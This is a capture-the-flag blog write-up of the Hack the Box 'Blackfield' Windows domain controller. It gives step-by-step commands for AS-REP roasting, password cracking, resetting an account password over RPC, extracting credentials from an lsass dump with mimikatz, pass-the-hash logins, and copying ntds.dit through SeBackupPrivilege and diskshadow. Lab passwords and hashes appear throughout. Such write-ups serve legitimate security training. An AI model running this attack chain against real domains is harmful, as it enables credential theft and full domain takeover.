+++
author = "Nick"
categories = ["hack the box", "Hard", "windows", "blackfield", "smbclient", "AESRepRoast", "GetNPUsers.py", "impacket", "john", "mimikatz", "command vm", "evil-winrm", "SeBackupOperator", "secretsdump", "ntds.dit", "kerberoast"]
date = 2020-10-03T14:55:58Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2020/06/info-3.png"
slug = "hack-the-box-blackfield"
tags = ["hack the box", "Hard", "windows", "blackfield", "smbclient", "AESRepRoast", "GetNPUsers.py", "impacket", "john", "mimikatz", "command vm", "evil-winrm", "SeBackupOperator", "secretsdump", "ntds.dit", "kerberoast"]
title = "Hack the Box - Blackfield"

+++


Welcome back! Today's write-up is for the Hack the Box machine - Blackfield. This machine is listed as a hard Windows box. Let's jump in!

As always, kick it off with `nmap`: `nmap -sC -sV -p- -oA allscan 10.10.10.192`

Here are the results:
```
Nmap scan report for 10.10.10.192
Host is up (0.089s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-22 20:53:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/22%Time=5EF0B6F3%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h04m08s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-22T20:56:06
|_  start_date: N/A
```

We attempt to enumerate `smb` with a null session using `smbmap` but no dice, however `smbclient` showed us some defaults.

Command:
`smbclient -L ////10.10.10.192// -U ''`

{{< figure src="__GHOST_URL__/content/images/2020/06/image-69.png" >}}

We seem to be able to connect via `rpcclient`.

Command:
`rpcclient -U "" -N 10.10.10.192`

Most commands are denied. We will try to connect to `forensic` and `profiles$` anonymously. 

Command:
`smbclient //10.10.10.192/forensic`

We log in but are denied listing access in this share.

{{< figure src="__GHOST_URL__/content/images/2020/06/image-70.png" >}}

We try again against the `profiles$` share and get quite a few results!

Command:
`smbclient //10.10.10.192/profiles$`

{{< figure src="__GHOST_URL__/content/images/2020/06/image-71.png" >}}

Now we need to take all these usernames and create a user list. We can copy the output of this file and save it as `users.lst`. Now we need to clean it up. To do this we issue a simple `awk` command.

Command:
`cat users.lst | awk '{print $1}' > cleaned_users.lst`

Now we have a cleaned up user list! We can sift through it to see what is listed. There seems to be some interesting accounts for a foothold: `audit2020`, `svc_backup` and `support`. With our listing of users we can try to [roast](https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/) for hashes.

Command:
`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py blackfield.local/ -usersfile cleaned_users.lst -format john -output hashes.lst -dc-ip 10.10.10.192`

{{< figure src="__GHOST_URL__/content/images/2020/06/blackfield_hash.gif" >}}

We get a few hashes we can feed over to `john`.

Command:
`john hashes.lst --wordlist=/usr/share/wordlists/rockyou.txt`

We get back a password of `#00^BlackKnight` for the user `support`.

{{< figure src="__GHOST_URL__/content/images/2020/06/image-72.png" >}}

Now with these credentials we'll want to use them to authenticate back to our `smb` shares and `rpcclient` for futher enumeration. Connecting to the `forensic` share still has listing denied. We are able to connect via `rpcclient` and enumerate a bit further.

Command:
`rpcclient -U "blackfield.local\support" 10.10.10.192`

Once connected we see that we have more permissions, obviously. We can now `queryuser support` and `enumprivs`this will give us what our permissions are listed as. After some trial and error of commands it seems we can use `setuserinfo2` to [change passwords](https://ptestmethod.readthedocs.io/en/latest/LFF-IPS-P3-Exploitation.html/).

Command:
`setuserinfo2 audit2020 23 'Password123!`

{{< figure src="__GHOST_URL__/content/images/2020/06/image-73.png" >}}

Now we'll try to login as `audit2020` to the previous `smb` shares to see what access they might have.

{{< figure src="__GHOST_URL__/content/images/2020/06/image-74.png" >}}

As we enumerate through the contents of these directories, we get some files and see some other interesting tools listed. As we look at the content of the files, we see an interesting user account:

{{< figure src="__GHOST_URL__/content/images/2020/06/image-75.png" >}}

As we continue to look at the data available it's pretty obvious that the files we want to look at are far too large to download via the `smbclient`. Time to mount the location.

Command:
`mount -t cifs //10.10.10.192/forensic ~/Documents/htb/blackfield/mount -o user=audit2020`

{{< figure src="__GHOST_URL__/content/images/2020/06/image-76.png" >}}

With that mounted we head right over to the `lsass.zip` file. We want this file in particular because if it is a dump, we can [obtain credentials](https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/) from it. So we copy the file a few levels back and extract it.

We extract the file, and it does indeed have the `.dmp` on it. We'll send it over to our Commando VM for the mimikatz magic.

Once over in Commando, we start a `Command Prompt` as Administrator and launch `mimikatz`.

First we set our debug.

Command:
`privilege::debug`

{{< figure src="__GHOST_URL__/content/images/2020/06/image-77.png" >}}

Next we load up the dump file.

Command:
`sekurlsa::minidump C:\Users\Commando\Downloads\x64\lsass.DMP`

{{< figure src="__GHOST_URL__/content/images/2020/06/image-78.png" >}}

Now we dump the creds.

Command:
`sekurlsa::LogonPasswords`

{{< figure src="__GHOST_URL__/content/images/2020/06/image-79.png" >}}

This starts to kick out a ton of info. Weget `NTLM` hashes for `Administrator` and for `svc_backup`. We can simply use these hashes for `Evil-WinRM`.

Command:
`evil-winrm.rb -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`

We get logged in and are able to get the `user.txt` flag. Now that we're in we start enumerating internally. We'll use the `upload` command in `Evil-WinRM` to put a copy of `winPEAS` on the machine and run it.

When we try to run it, it errors out and the file is removed. Assumably Windows Defender removed the file. Looks like we'll need to enumerate manually. The first command we issue is `whoami /all`. We see that this user has backup abilities and is part of the Backup Operators group. Here are two good resources on leveraging the `SeBackupPrivilege`, [one](https://decoder.cloud/2018/02/12/the-power-of-backup-operatos/) and [two](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf).

We can hopefully use `diskshadow` to run our script and get the `ntds.dit` file from the domain controller as shown on slide 23 of link two. 

First we create our malicous script as `script.txt`:

```
add volume c: alias mydrive9
create
expose %mydrive9% z:
```

Now we upload it via `Evil-WinRM`. Once uploaded we run `diskshadow` to call the script.

Command:
`diskshadow /s script.txt`

That didn't work. It looks like the commands are being truncated.

{{< figure src="__GHOST_URL__/content/images/2020/06/image-80.png" caption="" >}}

We modify the script, reupload and rerun. Another error. This time saying we needt o set a metadata writeable directory. In this case we can use the `NOWRITERS` option in our `SET` line, thanks [Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow).

Here's our finaly script:
```
set context persistent nowritersx
add volume c: alias mydrive9x
createx
expose %mydrive9% z:x
```

We rerun the command and it works!

{{< figure src="__GHOST_URL__/content/images/2020/06/image-81.png" >}}

So now that we have access to this copy of a the drive, how do we leverage it? Some googling around from our previous exploit lead us [here](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug). This GitHub repo has some .dll we can import and use. We upload them to our target and import them into our PowerShell session, [as shown](https://github.com/giuliano108/SeBackupPrivilege).

Command:
`import-module SeBackupPrivilegeUtils.dll`
`import-module SeBackupPrivilegeCmdLets.dll`

With those imported we can run the provided command to copy the file.

Command:
`Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit`

{{< figure src="__GHOST_URL__/content/images/2020/06/image-82.png" >}}

Now we have a copy of the `ntds.dit`. Next we need a copy of the system hive. We run the following to save that cluster.

Command:
`reg save HKLM\SYSTEM C:\Temp\system`

With these two files we can pick our dump [method of choice](https://www.hackingarticles.in/credential-dumping-ntds-dit/). Most of the time `secretsdump` is the tool of [choice](https://medium.com/@bondo.mike/extracting-and-cracking-ntds-dit-2b266214f277). We'll run the following to dump the hashes out.

Command:
`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -output system_hash`

Now we have our hashes, we can use the same method as before to pass the Administrator in `Evil-WinRM` to login as the Admin.

Command:
`evil-winrm.rb -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee`

{{< figure src="__GHOST_URL__/content/images/2020/06/blackfield_root.gif" >}}

We are in as Admin! We head over and snag the `root.txt` flag!

Hopefully this machine helped you learn something! Send some respect my way if this was helpful!
[HTB Profile](https://www.hackthebox.eu/home/users/profile/95635)



